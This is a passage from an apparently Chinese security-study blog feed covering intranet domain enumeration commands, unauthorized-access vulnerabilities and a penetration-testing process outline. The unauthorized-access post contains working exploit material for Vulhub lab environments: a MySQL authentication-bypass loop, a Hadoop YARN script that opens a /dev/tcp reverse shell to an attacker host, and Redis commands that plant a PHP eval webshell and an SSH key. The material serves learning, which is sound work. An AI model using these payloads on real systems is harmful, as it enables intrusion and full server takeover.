<strong>使得其风险最小化</strong>。</p><p><strong>一般安全域划分为：DMZ和内网。</strong></p><ul><li><p><strong>DMZ（Demilitarized Zone 非军事化区）称为隔离区。 为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</strong></p><p>DMZ不能访问内网，DMZ不能访问外网（此策略有例外，如mail服务）。</p></li><li><p><strong>内网又可以划分为：办公区和核心区。</strong></p><p>办公区会安装防病毒软件、主机入侵检测产品（HIDS）等，运维使用堡垒机（跳板机）来统一管理用户的登陆行为。</p></li></ul><h4 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h4><ul><li><p>单域</p><p>例如主公司和子公司都独自形成了一个域环境，称为单域，由此延伸出<strong>父域和子域</strong>。</p></li><li><p>父域和子域</p><p>父域可以管理子域。</p></li><li><p>域树和域森林</p><p>域的框架结构，很多分支形成了域森林。</p></li></ul><h4 id="内网常用命令"><a href="#内网常用命令" class="headerlink" title="内网常用命令"></a>内网常用命令</h4><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>net user ——&gt; 本机用户列表<br>net localhroup administrators ——&gt; 本机管理员[通常含有域用户]<br>net user &#x2F;domain ——&gt; 查询域用户<br>net group &#x2F;domain ——&gt; 查询域里面的工作组<br>net group “domain admins” &#x2F;domain ——&gt; 查询域管理员用户组<br>net localgroup administrators &#x2F;domain ——&gt; 登录本机的域管理员<br>net localgroup administrators workgroup\user001 &#x2F;add —–&gt;域用户添加到本机<br>net group “Domain controllers” ——-&gt; 查看域控制器(如果有多台)<br>ipconfig &#x2F;all ——&gt; 查询本机IP段，所在域等<br>net view ——&gt; 查询同一域内机器列表<br>net view &#x2F;domain ——&gt; 查询域列表<br>net view &#x2F;domain:domainname —–&gt; 查看workgroup域中计算机列表</p></blockquote><h4 id="内网渗透基本流程"><a href="#内网渗透基本流程" class="headerlink" title="内网渗透基本流程"></a>内网渗透基本流程</h4><ol><li><em>信息收集</em></li><li><em>权限获取</em></li><li><em>横向移动</em></li><li><em>权限维持</em></li><li><em>痕迹消除</em></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网基本概念&quot;&gt;&lt;a href=&quot;#内网基本概念&quot; class=&quot;headerlink&quot; title=&quot;内网基本概念&quot;&gt;&lt;/a&gt;内网基本概念&lt;/h2&gt;&lt;h4 id=&quot;局域网&quot;&gt;&lt;a href=&quot;#局域网&quot; class=&quot;headerlink&quot; title=&quot;局域网</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>未授权访问</title>
    <link href="https://myprefer.github.io/post/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
    <id>https://myprefer.github.io/post/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html</id>
    <published>2024-03-26T07:47:00.000Z</published>
    <updated>2024-03-26T15:09:50.816Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><ul><li>未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。</li></ul><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>泄露用户信息，系统信息</li><li>某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</li></ul><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h5 id="判断服务开放"><a href="#判断服务开放" class="headerlink" title="判断服务开放"></a>判断服务开放</h5><ul><li>Nmap端口扫描</li><li>组合猜测</li></ul><h5 id="判断服务类型"><a href="#判断服务类型" class="headerlink" title="判断服务类型"></a>判断服务类型</h5><ul><li>数据库</li><li>文件传输</li><li>远程控制</li><li>数据通信</li></ul><h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ul><li><p>环境:<a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">Mysql 身份认证绕过漏洞（CVE-2012-2122）</a></p></li><li><p>原理:</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<strong>只要知道用户名</strong>，不断尝试就能够<strong>直接登入</strong>SQL数据库。</p></blockquote></li><li><p>利用:</p><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #F78C6C">for</span><span style="color: #BABED8"> i </span><span style="color: #F78C6C">in</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">`</span><span style="color: #C3E88D">seq 1 1000</span><span style="color: #89DDFF">`</span><span style="color: #BABED8">; do mysql </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">uroot </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">pwrong </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">h your</span><span style="color: #89DDFF">-</span><span style="color: #BABED8">ip </span><span style="color: #89DDFF">-</span><span style="color: #BABED8">P3306 ; done</span></span></code></pre></div></li></ul><h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><ul><li><p>环境:<a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">Vulhub - Docker-Compose file for vulnerability environment</a></p></li><li><p>原理:</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>负责对资源进行同一管理调度的ReasourceManager组件的UI管理界面开放在8080&#x2F;8088端口，攻击者<strong>无需认证</strong>即可通过REST API部署任务来<strong>执行任意命令</strong>，最终可完全控制集群中所有的机器。</p></blockquote></li><li><p>脚本:</p><div class="language-python"><button title="Copy code" class="copy"></button><span class="lang">python</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #676E95; font-style: italic">#!/usr/bin/env python</span></span><span class="line"></span><span class="line"><span style="color: #89DDFF; font-style: italic">import</span><span style="color: #BABED8"> requests</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">target </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">http://127.0.0.1:8088/</span><span style="color: #89DDFF">&#39;</span></span><span class="line"><span style="color: #BABED8">lhost </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">192.168.0.1</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic"># put your local host ip here, and listen at port 9999</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">url </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> target </span><span style="color: #89DDFF">+</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">ws/v1/cluster/apps/new-application</span><span style="color: #89DDFF">&#39;</span></span><span class="line"><span style="color: #BABED8">resp </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">app_id </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> resp</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">json</span><span style="color: #89DDFF">()[</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">application-id</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">]</span></span><span class="line"><span style="color: #BABED8">url </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> target </span><span style="color: #89DDFF">+</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">ws/v1/cluster/apps</span><span style="color: #89DDFF">&#39;</span></span><span class="line"><span style="color: #BABED8">data </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#123;</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">application-id</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> app_id</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">application-name</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">get-shell</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">am-container-spec</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#123;</span></span><span class="line"><span style="color: #BABED8">        </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">commands</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#123;</span></span><span class="line"><span style="color: #BABED8">            </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">command</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">/bin/bash -i &gt;&amp; /dev/tcp/</span><span style="color: #F78C6C">%s</span><span style="color: #C3E88D">/9999 0&gt;&amp;1</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">%</span><span style="color: #BABED8"> lhost</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #BABED8">        </span><span style="color: #89DDFF">&#125;,</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #89DDFF">&#125;,</span></span><span class="line"><span style="color: #BABED8">    </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">application-type</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">:</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">YARN</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">,</span></span><span class="line"><span style="color: #89DDFF">&#125;</span></span><span class="line"><span style="color: #BABED8">requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #BABED8; font-style: italic">json</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">)</span></span><span class="line"></span></code></pre></div></li></ul><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><ul><li><p>原理:</p><ul><li>redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器</li><li>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</li></ul></li><li><p>利用:</p><ul><li><p>写webshell</p><ul><li><p>利用前提:</p><ol><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上, 并未登陆验证</p></li><li><p>开了web服务器，并且知道路径, 需要具有文件读写增删改查权限</p></li></ol></li><li><p>上传webshell</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">config</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">get</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">dir</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">#查看redis数据库路径</span></span><span class="line"><span style="color: #FFCB6B">config</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">dir</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/root/redis-2.8.17#</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">#修改靶机Redis数据库路径</span></span><span class="line"><span style="color: #FFCB6B">config</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">dbfilename</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">22</span><span style="color: #C3E88D">.php</span><span style="color: #BABED8"> </span><span style="color: #676E95; font-style: italic">#生成22.php文件</span></span><span class="line"><span style="color: #82AAFF">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">xxx</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">#将一句话木马写入文件中</span></span><span class="line"><span style="color: #676E95; font-style: italic">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span><span class="line"><span style="color: #82AAFF">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">xxx</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">\r\n\r\n&lt;?php eval(</span><span style="color: #BABED8">$_POST</span><span style="color: #C3E88D">[whoami]);?&gt;\r\n\r\n</span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">#上传木马可以通过蚁剑连接</span></span><span class="line"><span style="color: #FFCB6B">save#保存</span></span></code></pre></div></li></ul></li><li><p>ssh密钥连接</p><ul><li><p>利用前提:</p><ol><li>root身份运行</li><li>存在&#x2F;root&#x2F;.ssh目录</li></ol></li><li><p>将公钥上传到靶机</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #82AAFF">type</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">key.txt</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">redis-cli.exe</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-h</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">192.168</span><span style="color: #C3E88D">.43.141</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-x</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">xxx#如果是linux</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">将type换成cat</span></span><span class="line"><span style="color: #676E95; font-style: italic">#将公钥作为value插入到数据库中，key随便啥值。</span></span><span class="line"><span style="color: #FFCB6B">redis-cli.exe</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-h</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">192.168</span><span style="color: #C3E88D">.43.141</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">config</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">dir</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">/root/.ssh</span></span><span class="line"><span style="color: #676E95; font-style: italic">#修改redis数据库路径</span></span><span class="line"><span style="color: #FFCB6B">redis-cli.exe</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-h</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">192.168</span><span style="color: #C3E88D">.43.141</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">config</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">set</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">dbfilename</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">authorized_keys</span></span><span class="line"><span style="color: #676E95; font-style: italic">#生成缓冲文件authorized_keys</span></span><span class="line"><span style="color: #FFCB6B">redis-cli.exe</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-h</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">192.168</span><span style="color: #C3E88D">.43.141</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">save</span></span><span class="line"><span style="color: #676E95; font-style: italic">#保存</span></span><span class="line"><span style="color: #FFCB6B">ssh</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">-i</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">id_rsa</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">root@192.168.43.141</span></span><span class="line"><span style="color: #676E95; font-style: italic">#连接</span></span></code></pre></div></li></ul></li><li><p>RCE自动化利用脚本<br><a href="https://github.com/vulhub/redis-rogue-getshell">vulhub&#x2F;redis-rogue-getshell: redis 4.x&#x2F;5.x master&#x2F;slave getshell module (github.com)</a></p></li></ul></li></ul><h3 id="常见漏洞汇总"><a href="#常见漏洞汇总" class="headerlink" title="常见漏洞汇总"></a>常见漏洞汇总</h3><ul><li><p><a href="https://www.freebuf.com/articles/web/338459.html">常用的30+种未授权访问漏洞汇总 - FreeBuf网络安全行业门户</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/IK7n5onsyssmJyf5SPpw6A">网络安全周周学 | 常见未授权访问漏洞汇总</a></p></li></ul><h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞简述&quot;&gt;&lt;a href=&quot;#漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;漏洞简述&quot;&gt;&lt;/a&gt;漏洞简述&lt;/h3&gt;&lt;h4 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h</summary>
      
    
    
    
    
    <category term="网络安全" scheme="https://myprefer.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="学习日志" scheme="https://myprefer.github.io/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>(转)渗透测试-基本流程</title>
    <link href="https://myprefer.github.io/post/%E8%BD%AC-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B.html"/>
    <id>https://myprefer.github.io/post/%E8%BD%AC-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B.html</id>
    <published>2024-03-21T14:50:33.000Z</published>
    <updated>2024-03-21T14:51:34.220Z</updated>
    
    <content type="html"><![CDATA[<p>一般来说，渗透测试的基本流程如下：</p><ol><li>确定目标</li><li>信息收集</li><li>漏洞探测</li><li>漏洞利用getshell</li><li>内网转发</li><li>内网渗透</li><li>痕迹清除</li><li>撰写渗透测试报告</li></ol><h2 id="一-确定目标"><a href="#一-确定目标" class="headerlink" title="一 确定目标"></a><strong>一 确定目标</strong></h2><p>这个没什么好说的就是确定你的渗透目标是什么。</p><h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二 信息收集"></a><strong>二 信息收集</strong></h2><p><strong>信息收集是整个渗透测试中最重要的一步</strong>，你要把你要攻击的目标全部探测清楚，才能更好的攻击。<strong>信息收集的越丰富，内容或情报收集的越多，攻击的成功率就越高。</strong></p><p>而信息收集到底要收集哪些信息呢？接下来，我就给大家整理了一下，渗透测试中常见的一些需要收集的信息。</p><p><strong>1.主机扫描(Nessus)</strong></p><p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p><p>主机扫描的工具也有很多，比如：Nessus</p><p><strong>2.端口扫描(nmap)</strong></p><p>需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：</p><p>22——&gt;ssh弱口令</p><p>873——&gt;rsync 未授权访问漏洞</p><p>3306——&gt;mysql弱口令</p><p>6379——&gt;redis未授权访问漏洞</p><p>端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。</p><p><strong>3.网站敏感目录和文件</strong></p><p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p><ul><li>后台目录：弱口令，万能密码，爆破</li><li>安装包：获取数据库信息，甚至是网站源码</li><li>上传目录：截断、上传图片马等</li><li>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</li><li>安装页面 ：可以二次安装进而绕过</li><li>phpinfo：会把你配置的各种信息暴露出来</li><li>编辑器：fck、ke、等</li><li>iis短文件利用：条件比较苛刻 windows、apache等</li></ul><p>提到了网站敏感目录我们就不得不提 robots.txt 文件了</p><p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可</p><p>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。</p><p>假如编写的robots.txt文件内容如下：</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">User-agent: *</span></span><span class="line"><span style="color: #babed8">Disallow: /data/</span></span><span class="line"><span style="color: #babed8">Disallow: /db/</span></span><span class="line"><span style="color: #babed8">Disallow: /admin/</span></span><span class="line"><span style="color: #babed8">Disallow: /manager/</span></span><span class="line"><span style="color: #babed8">Allow:/images/</span></span></code></pre></div><p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 &#x2F;data&#x2F; 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p><p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p><p>探测目标网站后台目录的工具有：wwwscan 、御剑 、 dirbuster、cansina 等</p><p><strong>4.旁站和C段扫描</strong></p><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p><p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p><p><strong>5.网站漏洞扫描</strong></p><p>网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 